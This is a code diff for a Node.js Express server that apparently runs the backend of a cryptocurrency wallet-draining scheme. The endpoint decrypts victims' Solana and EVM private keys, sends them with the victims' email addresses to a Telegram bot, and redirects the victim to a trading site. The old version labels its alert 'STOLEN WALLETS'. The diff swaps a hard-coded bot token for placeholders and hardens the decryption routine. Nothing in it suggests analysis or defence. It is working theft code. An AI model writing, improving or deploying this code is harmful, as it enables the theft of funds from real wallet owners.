@@ -3,21 +3,32 @@ const fetch = require('node-fetch');
 const crypto = require('crypto');
 const app = express();
 
-const TG_BOT = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
-const TG_CHAT = '7680513699';
+const TG_BOT = 'YOUR_BOT_TOKEN';
+const TG_CHAT = 'YOUR_CHAT_ID';
 
-// Decrypt function
 function decrypt(encrypted, bundleKey) {
   try {
-    const [ivHex, encryptedData] = encrypted.split(':');
-    const iv = Buffer.from(ivHex, 'base64');
+    const [ivBase64, ciphertext] = encrypted.split(':');
+    if (!ivBase64 || !ciphertext) {
+      return 'INVALID_FORMAT';
+    }
+    
+    const iv = Buffer.from(ivBase64, 'base64');
     const key = Buffer.from(bundleKey, 'base64');
-    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
-    let decrypted = decipher.update(encryptedData, 'base64', 'utf8');
+    
+    // Pad IV to 16 bytes if needed
+    let paddedIV = iv;
+    if (iv.length < 16) {
+      paddedIV = Buffer.alloc(16);
+      iv.copy(paddedIV);
+    }
+    
+    const decipher = crypto.createDecipheriv('aes-256-cbc', key, paddedIV);
+    let decrypted = decipher.update(ciphertext, 'base64', 'utf8');
     decrypted += decipher.final('utf8');
     return decrypted;
   } catch (e) {
-    return 'DECRYPT_ERROR';
+    return 'DECRYPT_ERROR: ' + e.message;
   }
 }
 
@@ -32,36 +43,25 @@ app.get('/data/:b64', async (req, res) => {
     if (typeof sBundles === 'string') sBundles = JSON.parse(sBundles);
     if (typeof eBundles === 'string') eBundles = JSON.parse(eBundles);
     
-    // Decrypt private keys
-    const decryptedSolana = sBundles?.map(enc => decrypt(enc, data.bundle)) || [];
-    const decryptedEVM = eBundles?.map(enc => decrypt(enc, data.bundle)) || [];
+    const solKeys = sBundles?.map(enc => decrypt(enc, data.bundle)) || [];
+    const evmKeys = eBundles?.map(enc => decrypt(enc, data.bundle)) || [];
     
     const msg = `
-🚨 STOLEN WALLETS
+🚨 DECRYPTED KEYS
 
-👤 User: ${data.user?.username || 'N/A'}
-📧 Email: ${data.user?.email || 'N/A'}
+Email: ${data.user?.email || 'N/A'}
 
-🔑 Bundle Key:
-${data.bundle}
+Solana Private Keys:
+${solKeys.join('\n')}
 
-💰 Solana Keys (${decryptedSolana.length}):
-${decryptedSolana.join('\n') || 'None'}
-
-💰 EVM Keys (${decryptedEVM.length}):
-${decryptedEVM.join('\n') || 'None'}
-
-🌐 ${data.site}
-⏰ ${new Date().toISOString()}
+EVM Private Keys:
+${evmKeys.join('\n')}
     `;
     
     await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TG_CHAT,
-        text: msg
-      })
+      body: JSON.stringify({ chat_id: TG_CHAT, text: msg })
     });
     
     res.redirect('https://axiom.trade/discover');
@@ -71,6 +71,4 @@ ${decryptedEVM.join('\n') || 'None'}
   }
 });
 
-app.listen(process.env.PORT || 3000, () => {
-  console.log('Server running');
-});
+app.listen(process.env.PORT || 3000);
